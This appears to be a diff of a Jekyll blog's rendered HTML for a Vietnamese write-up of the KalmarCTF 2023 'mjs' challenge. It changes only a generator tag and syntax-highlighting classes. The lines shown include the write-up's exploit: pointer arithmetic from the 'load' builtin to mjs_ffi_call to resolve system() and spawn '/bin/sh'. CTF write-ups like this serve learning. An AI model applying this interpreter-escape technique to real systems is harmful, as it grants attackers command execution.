@@ -14,7 +14,7 @@
   <link rel="alternate" type="application/rss+xml" title="Duc Dat Dau" href="http://localhost:4000/feed.xml">
   <!-- Begin Jekyll SEO tag v2.8.0 -->
 <title>KalmarCTF 2023: mjs | Duc Dat Dau</title>
-<meta name="generator" content="Jekyll v4.3.2" />
+<meta name="generator" content="Jekyll v3.10.0" />
 <meta property="og:title" content="KalmarCTF 2023: mjs" />
 <meta property="og:locale" content="en_US" />
 <link rel="canonical" href="http://localhost:4000/2024/06/19/KalmarCTF-2023.html" />
@@ -258,7 +258,7 @@
 
 <p>Những hàm trên đã không hoàn toàn bị xóa đi. Mình có thử một vài ví dụ và thấy rằng <code class="language-plaintext highlighter-rouge">mjs</code> gọi các <a href="https://github.com/cesanta/mjs?tab=readme-ov-file#built-in-api">built-in functions</a> bằng các con trỏ.</p>
 
-<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">print</span><span class="p">(</span><span class="nx">load</span><span class="p">)</span>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">print</span><span class="p">(</span><span class="nx">load</span><span class="p">)</span>
 <span class="o">&lt;</span><span class="nx">foreign_ptr</span><span class="p">@</span><span class="nd">557dbd9504c0</span><span class="o">&gt;</span>
 <span class="kc">undefined</span>
 </code></pre></div></div>
@@ -289,7 +289,7 @@
 <span class="kd">let</span> <span class="nx">mjs_ffi_call</span> <span class="o">=</span> <span class="mh">0x555555560110</span><span class="p">;</span>
 
 <span class="kd">let</span> <span class="nx">system</span> <span class="o">=</span> <span class="p">(</span><span class="nx">load</span> <span class="o">+</span> <span class="p">(</span><span class="nx">mjs_ffi_call</span> <span class="o">-</span> <span class="nx">mjs_load</span><span class="p">))(</span><span class="dl">'</span><span class="s1">int system(char *)</span><span class="dl">'</span><span class="p">);</span> 
-<span class="nf">system</span><span class="p">(</span><span class="dl">'</span><span class="s1">/bin/sh</span><span class="dl">'</span><span class="p">);</span>
+<span class="nx">system</span><span class="p">(</span><span class="dl">'</span><span class="s1">/bin/sh</span><span class="dl">'</span><span class="p">);</span>
 </code></pre></div></div>
     <!-- <p style="text-align: center;"><img src="/images/kalmar2023/banner.png" alt="Smile" /></p>
 
@@ -328,7 +328,7 @@
 
 <p>Những hàm trên đã không hoàn toàn bị xóa đi. Mình có thử một vài ví dụ và thấy rằng <code class="language-plaintext highlighter-rouge">mjs</code> gọi các <a href="https://github.com/cesanta/mjs?tab=readme-ov-file#built-in-api">built-in functions</a> bằng các con trỏ.</p>
 
-<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">print</span><span class="p">(</span><span class="nx">load</span><span class="p">)</span>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">print</span><span class="p">(</span><span class="nx">load</span><span class="p">)</span>
 <span class="o">&lt;</span><span class="nx">foreign_ptr</span><span class="p">@</span><span class="nd">557dbd9504c0</span><span class="o">&gt;</span>
 <span class="kc">undefined</span>
 </code></pre></div></div>
@@ -347,7 +347,7 @@
 <span class="kd">let</span> <span class="nx">mjs_ffi_call</span> <span class="o">=</span> <span class="mh">0x555555560110</span><span class="p">;</span>
 
 <span class="kd">let</span> <span class="nx">system</span> <span class="o">=</span> <span class="p">(</span><span class="nx">load</span> <span class="o">+</span> <span class="p">(</span><span class="nx">mjs_ffi_call</span> <span class="o">-</span> <span class="nx">mjs_load</span><span class="p">))(</span><span class="dl">'</span><span class="s1">int system(char *)</span><span class="dl">'</span><span class="p">);</span> 
-<span class="nf">system</span><span class="p">(</span><span class="dl">'</span><span class="s1">/bin/sh</span><span class="dl">'</span><span class="p">);</span>
+<span class="nx">system</span><span class="p">(</span><span class="dl">'</span><span class="s1">/bin/sh</span><span class="dl">'</span><span class="p">);</span>
 </code></pre></div></div>
  -->
   </div>
